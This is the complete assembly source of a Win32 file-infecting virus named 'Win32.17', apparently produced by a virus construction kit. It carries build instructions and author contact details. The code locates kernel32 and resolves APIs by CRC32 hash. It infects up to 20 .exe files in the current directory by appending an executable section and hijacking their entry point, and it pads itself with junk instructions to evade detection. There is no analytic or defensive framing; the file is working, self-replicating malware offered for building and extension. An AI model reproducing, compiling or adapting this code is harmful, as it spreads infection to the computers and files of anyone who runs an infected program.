              
;
;
; Win32.17 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.17
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 17
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 39
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ecx
 sub ecx, offset Delta
                                        ; mov ebp, ecx
 mov ebp, ecx
 jmp KernelSearchStart


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ecx, dword ptr [esp]
                                        ; round to pages
 xor cx, cx
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 4h

GK1:                                    ; check for DOS-EXE Stub
 mov ebx, dword ptr [ebp+K32Trys]
 or ebx, ebx
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 movzx ebx, word ptr [ecx]
 cmp ebx, 'ZM'
 je CheckPE

GK2:
                                        ; mov edx, 65536
 mov edx, ( 65536d - 30d )
 add edx, 30d
 sub ecx, edx
 inc dword ptr [ebp+K32Trys]
 sub dword ptr [ebp+K32Trys], 2
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov esi, [ecx+3Ch]
 xchg esi, ecx
 add ecx, esi
 xchg esi, ecx
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 mov dword ptr [ebp+KernelPE], esi
 mov dword ptr [ebp+KernelMZ], ecx

 jmp GetApis

;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx

                                        ; clear edi
 mov edi, 15399d
 sub edi, 15399d
 xor edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ecx, [ebp+filemask]
 xchg ecx, edx

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
                                        ; mov ecx, 20
 mov ecx, 20d
 mov dword ptr [ebp+InfCounter], ecx

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; mov ebx, -1
 mov ebx, -1d
 and ebx, dword ptr [ebp+InfCounter]
 cmp ebx, 0
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; mov edx, -1
 mov edx, ( -1d - 15d )
 add edx, 15d
 and edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]

 push dword ptr [ebp+OldBase]
 pop ebx

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ebx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 adc dword ptr [ebp+Trash1], 1902242    ; Trash
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 push dword ptr [ebp+MapAddress]
 pop eax
                                        ; retrieve PE - Header
 mov esi, eax
 add esi, [eax+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov ecx, [esi]
 add esi, -60d
 mov dword ptr [ebp+filealign], ecx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
 and eax, eax                           ; Trash
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 push ecx
 pop dword ptr [ebp+PEheader]
                                        ; get old Entrypoint
 mov eax, dword ptr [ecx+34h]
 mov dword ptr [ebp+OldBase], eax
 mov edx, dword ptr [ecx+28h]
 push edx
 sbb eax, 18d                           ; Trash
 pop dword ptr [ebp+OldEIP]
 and eax, ecx                           ; Trash
 mov ebx, [ecx+38h]
 mov dword ptr [ebp+sectionalign], 0
 add dword ptr [ebp+sectionalign], ebx
                                        ; Get last section
 mov edx, [ecx+74h]
 shl edx, 3
                                        ; clear ebx
 push 0
 pop ebx
 mov bx, word ptr [ecx+6h]
 mov eax, 28h
 pushad
 mov eax, ebx
 mul eax
 push eax
 pop dword ptr [ebp+Misc1]
 popad
 mov ebx, dword ptr [ebp+Misc1]
 add ecx, 78h
 add ecx, edx
 add ecx, ebx
 mov eax, offset newsection
 add eax, ebp


 xchg eax, ecx
 push eax
                                        ; Calculate the RVA of the new section
 mov edx, [eax-5*8+8d]
 add edx, [eax-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+nsphysicalsize], edx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], VirusSize
 and ebx, 80410604d                     ; Trash
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], ebx
                                        ; calculate physical offset
 mov ebx,[eax-5*8+20d]
 add ebx,[eax-5*8+16d]
 mov edx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], edx
 xor ecx, 34943820d                     ; Trash
 Call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], ecx
                                        ; calculate new size
                                        ; clear ebx
 mov ebx, 12930d
 sub ebx, 12930d
 xor ebx, dword ptr [ebp+filealign]
 mov eax, ecx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ebx
 push eax
 pop dword ptr [ebp+AlignReg1]
 call Align
                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 lea ecx, [ebp+newsection]
 xchg ecx, eax

                                        ; mov ebx, 64
 mov ebx, 0
 add ebx, 64d
 pop edi
WriteNewSectionLoop:
 mov ch, byte ptr [eax]
 mov byte ptr [edi], ch
                                        ; add eax, 1
 add eax, 1d
 add ebx, -1
                                        ; add edi, 1
 inc edi
 cmp ebx, 0
 jne WriteNewSectionLoop
                                        ; increase section numbers
                                        ; mov eax, -1
 mov eax, ( -1d xor 25d )
 xor eax, 25d
 and eax, dword ptr [ebp+PEheader]
 add word ptr [eax+06h], 1
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [eax+28h], edx
                                        ; set infection mark
 mov dword ptr [eax+4Ch], 0h
 add dword ptr [eax+4Ch], '17'
                                        ; clear edx
 mov edx, 0
 add edx, dword ptr [ebp+nsphysicaloffset]
 push edx
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 mov esi, offset Virus
 add esi, ebp


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov eax, dword ptr [ebp+InfCounter]
 add eax, -1
 adc edx, 16215670d                     ; Trash
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 pop edx
 stc
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

                                        ; clear edx
 mov edx, 61334d
 sub edx, 61334d
 add edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 xor esi, esi
 add esi, [edx+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 add esi, 28d
                                        ; get ATableVA
 mov edx, dword ptr [esi]
 add edx, [ebp+KernelMZ]
                                        ; add esi, 4
 dec esi
 add esi, 5d
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [esi]
                                        ; add esi, 4
 add esi, 4d
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
                                        ; get OTableVA
 mov edx, dword ptr [esi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
                                        ; number of API's we're looking for
 mov ebx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APINames]

 mov edi, offset APIOffsets
 add edi, ebp


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; search 'em
                                        ; eax points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add eax, 4
 inc eax
 add eax, 3d
                                        ; mov esi, -1
 mov esi, ( -1d xor 17d )
 xor esi, 17d
 and esi, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], -1
 and dword ptr [edi], esi
                                        ; add edi, 4
 add edi, 4d
 dec ebx
 jnz GetApisLoop
 lea ebx, [ebp+Outbreak]
 xchg esi, ebx

 push esi
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]
 xchg eax, edx

 push eax
                                        ; clear edx
 mov edx, 0
 add edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, ( 276d + 14d )
 sub ebx, 14d
 lea edi, [ebp+WFD_szFileName]
 xchg ecx, edi


ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 inc ecx
 dec ebx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov esi, ebp
 add esi, offset WIN32_FIND_DATA

 push esi
 push edx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 mov eax, dword ptr [ebp+AlignReg1]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 mov ebx, 25202d
 sub ebx, 25202d

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 inc ebx
 push ebx
 push 80000000h or 40000000h
 mov esi, ebp
 add esi, offset WFD_szFileName

 push esi
 call dword ptr [ebp+XCreateFileA]

 inc eax
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 push 0
 push edx
 push 0
                                        ; mov ebx, 4
 push 4d
 pop ebx
 push ebx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz CloseFile
                                        ; clear eax
 mov eax, 0
 push edx
 push eax
 push eax
                                        ; mov ebx, 2
 mov ebx, ( 2d + 10d )
 sub ebx, 10d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ebx], 'ZM'
 je Goodfile
                                        ; mov ecx, 13794
 push 13794d
 pop ecx
 or ecx, ecx
 jnz Notagoodfile
Goodfile:
                                        ; clear eax
 sub eax, eax
 mov ax, word ptr [ebx+3Ch]
 or eax, eax
 jz Notagoodfile
                                        ; clear edi
 mov edi, 49849d
 sub edi, 49849d
 add edi, dword ptr [ebx+3Ch]
                                        ; check if header lies inside the file
 cmp edi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edi, ebx
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [edi]
 sub eax, 'EP'
 jz Goodfile2
                                        ; clear ecx
 and ecx, 0
                                        ; add ecx, 1
 inc ecx
 sub ecx, 1
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], '17'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], 0
 add dword ptr [ebp+NTableTemp], ebx
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
                                        ; mov ebx, edx
                                        ; clear ebx
 and ebx, 0
 add ebx, edx
                                        ; mov esi, ebx
 push ebx
 pop esi
 mov dword ptr [ebp+TempApisearch2], 0
 and dword ptr [ebp+Trash1], 1966939    ; Trash
 xor dword ptr [ebp+TempApisearch2], esi
 push eax
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; eax Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
                                        ; mov edx, -1
 push -1d
 pop edx
 and edx, dword ptr [ebp+APICRC32]
 sub edx, dword ptr [eax]
 or edx, edx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop eax
                                        ; mov ebx, -1
 mov ebx, ( -1d xor 2d )
 xor ebx, 2d
 and ebx, dword ptr [ebp+NTableTemp]
 rol ecx, 22d                           ; Trash
 mov esi, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 add ebx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
                                        ; retrieve the offset
 movzx ecx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl ecx, 1                             ; multiply with 2
 add ecx, dword ptr [ebp+OTableVA]
 mov edi, ecx
 movzx ecx, word ptr [edi]
 clc
 rcl ecx, 2h
 add ecx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [ecx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 filealign   dd 0h
 NTableVA    dd 0h
 NTableTemp  dd 0h
 OldEIP      dd 0h
 Misc1       dd 0h
 MapAddress  dd 0h
 NewEIP      dd 0h
 db 'Win32.17 created by SnakeByte',0
 K32Trys     dd 0h
 counter     dw 0h
 APICRC32    dd 0h
 KernelMZ    dd 0h
 TempApisearch2 dd 0h
 ATableVA    dd 0h
 Trash1      dd 0h
 NewSize     dd 0h
 KernelPE    dd 0h
 AlignReg2   dd 0h


 APIOffsets:
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h

 TempAPI     dd 0h
 FileHandle  dd 0h
 filemask    db '*.eXE',0
 FindHandle  dd 0h
 AlignReg1   dd 0h
 OTableVA    dd 0h
 PEheader    dd 0h
 MapHandle   dd 0h
 InfCounter  dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.cBMbTLC'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 OldBase     dd 400000h

 APINames:
 dd 08C892DDFh           ; CreateFileA
 dd 0797B49ECh           ; MapViewOfFile
 dd 0AA700106h           ; FindNextFileA
 dd 068624A9Dh           ; CloseHandle
 dd 0C200BE21h           ; FindClose
 dd 094524B42h           ; UnmapViewOfFile
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 096B2D96Ch           ; CreateFileMappingA

 sectionalign   dd 0h




;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov edi, esi
 mov edi, esi
                                        ; mov eax, esi
                                        ; clear eax
 sub eax, eax
 add eax, esi
LenCRC:
                                        ; add eax, 1
 inc eax
 cmp byte ptr [eax], 0
 jne LenCRC
 sub eax, edi
                                        ; mov esi, eax
 push eax
 pop esi
                                        ; add esi, 1
 add esi, 1d
 cld
                                        ; clear ecx
 mov ecx, -28761d
 add ecx, 28761d
 add ecx, -1
                                        ; mov ebx, ecx
 push ecx
 pop ebx
NextByteCRC:
                                        ; clear eax
 push 0
 pop eax
                                        ; clear edx
 xor edx, edx
 mov al, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 xor al, cl
 mov cl, ch
 mov ch, bl
 mov bl, bh
 mov bh, 8
NextBitCRC:
 shr dx, 1
 rcr ax, 1
jnc NoCRC
 xor ax,08320h
 xor dx,0EDB8h
NoCRC:
 dec bh
jnz NextBitCRC
 xor ecx, eax
 xor ebx, edx
 dec esi
jnz NextByteCRC
 not ebx
 not ecx
 mov eax, ebx
 rol eax, 16d
 mov ax, cx
 mov dword ptr [ebp+APICRC32], 0
 xor dword ptr [ebp+APICRC32], eax
 popad
ret



CryptEnd:
 sub ebx, 24214374d                     ; Trash
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

